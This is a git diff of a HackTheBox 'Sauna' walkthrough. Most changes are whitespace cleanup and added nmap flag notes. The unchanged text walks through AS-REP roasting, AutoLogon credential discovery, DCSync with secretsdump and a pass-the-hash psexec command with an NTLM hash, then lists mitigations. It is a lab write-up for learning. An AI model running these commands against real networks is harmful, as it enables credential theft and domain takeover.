@@ -30,10 +30,16 @@ __Priv Esc__
 
 ***
 
-This is my guide to the HackTheBox Windows machine _Sauna_. 
+This is my guide to the HackTheBox Windows machine _Sauna_.
 ## User Flag
 
-We'll start _Sauna_ by running my `nmap` scan. By the looks of the running services, this box is an Active Directory domain controller. 
+We'll start _Sauna_ by running my `nmap` scan. By the looks of the running services, this box is an Active Directory domain controller.
+
+- __sC__: Enable common scripts
+
+- __sV__: version and service on the port
+
+- __O__: remote OS detection using fingerprinting
 
 ```bash
 # Nmap 7.80 scan initiated Fri Jun  5 18:02:46 2020 as: nmap -sC -sV -O -oA scan175 10.10.10.175
@@ -42,12 +48,12 @@ Host is up (0.11s latency).
 Not shown: 988 filtered ports
 PORT     STATE SERVICE       VERSION
 53/tcp   open  domain?
-| fingerprint-strings: 
-|   DNSVersionBindReqTCP: 
+| fingerprint-strings:
+|   DNSVersionBindReqTCP:
 |     version
 |_    bind
 80/tcp   open  http          Microsoft IIS httpd 10.0
-| http-methods: 
+| http-methods:
 |_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/10.0
 |_http-title: Egotistical Bank :: Home
@@ -72,10 +78,10 @@ Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 |_clock-skew: 8h03m51s
-| smb2-security-mode: 
-|   2.02: 
+| smb2-security-mode:
+|   2.02:
 |_    Message signing enabled and required
-| smb2-time: 
+| smb2-time:
 |   date: 2020-06-06T07:09:33
 |_  start_date: N/A
 
@@ -83,7 +89,7 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Fri Jun  5 18:07:48 2020 -- 1 IP address (1 host up) scanned in 302.89 seconds
 ```
 
-Additionally, we'll run a full port scan as well. 
+Additionally, we'll run a full port scan as well.
 
 ```bash
 $ sudo nmap -sC -sV -O -p- -oA full175 10.10.10.175
@@ -100,11 +106,11 @@ $ enum4linux 10.10.10.175
 
 Nothing of significance is revealed.
 
-Alright, the box is also running `IIS` on port 80, so let's see what we can enumerate on their website. Under the `About Us` tab we find information on the team, who may potentially be users. We'll add them to a users text file. 
+Alright, the box is also running `IIS` on port 80, so let's see what we can enumerate on their website. Under the `About Us` tab we find information on the team, who may potentially be users. We'll add them to a users text file.
 
 ![](images/users.png)
 
-We'll format the names in a typical way you may see them on an Active Directory environment. Let's go ahead and do a few variants to just to be sure. 
+We'll format the names in a typical way you may see them on an Active Directory environment. Let's go ahead and do a few variants to just to be sure.
 
 ```
 fergus.smith
@@ -121,9 +127,9 @@ hbear
 skerb
 ```
 
-Without passwords, one of our options on a Windows domain controller using `Kerberos` is something called kerberoasting. [This article](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/) is a great resource that goes into better detail on these processes. Essentially, we can use a [tool from Impacket](https://github.com/SecureAuthCorp/impacket) to potential harvest some non-preauth AS_REP responses. This may reveal some password hashes that we can crack. 
+Without passwords, one of our options on a Windows domain controller using `Kerberos` is something called kerberoasting. [This article](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/) is a great resource that goes into better detail on these processes. Essentially, we can use a [tool from Impacket](https://github.com/SecureAuthCorp/impacket) to potential harvest some non-preauth AS_REP responses. This may reveal some password hashes that we can crack.
 
-Using our list, we can run our command `GetNPUsers.py` to attempt to harvest these responses. 
+Using our list, we can run our command `GetNPUsers.py` to attempt to harvest these responses.
 
 ```
 $ GetNPUsers.py -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -format hashcat
@@ -157,14 +163,14 @@ We successfully connect. Now we have our foothold, let's collect the user flag.
 
 ## Root Flag
 
-Now that we have a foothold, let's upload `winPEAS.exe` to [enumerate the system further](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) and see what options exist for privilege escalation. 
+Now that we have a foothold, let's upload `winPEAS.exe` to [enumerate the system further](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) and see what options exist for privilege escalation.
 
 ```
 > upload winPEASany.exe
 > ./winPEASany.exe
 ```
 
-The results come back and it looks like some AutoLogon credentials were found for the user `svc_loanmgr`. We can verify the correct username by using the command `net user /domain`. 
+The results come back and it looks like some AutoLogon credentials were found for the user `svc_loanmgr`. We can verify the correct username by using the command `net user /domain`.
 
 ![](images/autolog.png)
 
@@ -194,7 +200,7 @@ $ secretsdump.py -just-dc-ntlm EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175
 
 ![](images/secrets.png)
 
-Success! We receive NTLM hashes for all the users, including the Administrator. Let's use psexec.py to perform a pass-the-hash attack, and connect to the box as the Administrator. 
+Success! We receive NTLM hashes for all the users, including the Administrator. Let's use psexec.py to perform a pass-the-hash attack, and connect to the box as the Administrator.
 
 ```
 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff administrator@10.10.10.175
@@ -215,7 +221,7 @@ Finally, let's capture the root flag.
 
 - There a few ways to mitigate the risk of kerberoasting; a strong password policy helps alleviate the chance that someone will crack a hash. Additionally, avoid accounts with pre-authentication. If an organization must have that enabled, they need to have very complex passwords, as the hash is readily exposed.
 
-- AutoLogin credentials should be avoided. If an account must have that enabled, special consideration should be taken regarding the risks of a compromise of that account's privileges. 
+- AutoLogin credentials should be avoided. If an account must have that enabled, special consideration should be taken regarding the risks of a compromise of that account's privileges.
 
 - A system administrator must understand the implication of a user having the right to DCSync and the implications of a DCSync attack being performed. The user that ends up with this right must be protected. AutoLogin credentials on such a user is poor risk mitigation.
 
